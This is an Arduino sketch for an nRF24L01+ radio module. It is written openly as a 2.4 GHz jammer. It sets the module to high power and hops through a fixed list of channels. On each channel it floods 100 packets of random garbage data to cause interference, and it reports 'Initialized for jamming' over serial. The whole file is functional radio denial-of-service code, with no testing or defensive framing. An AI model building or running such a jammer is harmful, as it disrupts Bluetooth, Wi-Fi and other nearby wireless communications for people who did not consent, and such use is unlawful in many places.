#include <SPI.h>
#include "RF24.h"

RF24 radio(9, 10);  // CE, CSN

// Predefined hopping channels for interference
byte hopping_channel[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80, 82, 84, 86};
byte ptr_hop = 0;
byte garbage_data[32];  // Random data to flood the channels

void setup() {
  Serial.begin(115200);

  // Check if nRF24L01+ is properly connected
  if (!radio.begin()) {
    Serial.println("❌ NRF24L01+ Module failed to initialize.");
    while (1);  // Halt the program if initialization fails
  }

  // Set power to maximum and data rate to 2 Mbps for faster transmission
  radio.setPALevel(RF24_PA_HIGH);  // High power for maximum interference
  radio.setDataRate(RF24_2MBPS);   // Fast data rate for rapid flooding

  // Set the first channel to start on
  radio.setChannel(hopping_channel[ptr_hop]);

  // Prepare the garbage data
  for (int i = 0; i < sizeof(garbage_data); i++) {
    garbage_data[i] = random(0, 255);
  }

  Serial.println("✅ NRF24L01+ Initialized for jamming.");
}

void loop() {
  // Perform channel hopping
  ptr_hop++;
  if (ptr_hop >= sizeof(hopping_channel)) ptr_hop = 0;  // Loop back if we reach the end

  // Set the new channel to disrupt
  radio.setChannel(hopping_channel[ptr_hop]);

  // Flood the channel with garbage data
  for (int i = 0; i < 100; i++) {  // Send 100 packets per channel
    radio.write(garbage_data, sizeof(garbage_data));  // Write random data
  }

  // Print the current channel for debugging
  Serial.print("Hopping to channel: ");
  Serial.println(hopping_channel[ptr_hop]);

  // Short delay to manage interference rate (faster hopping)
  delay(10);  // Reducing the delay allows faster frequency hopping
}
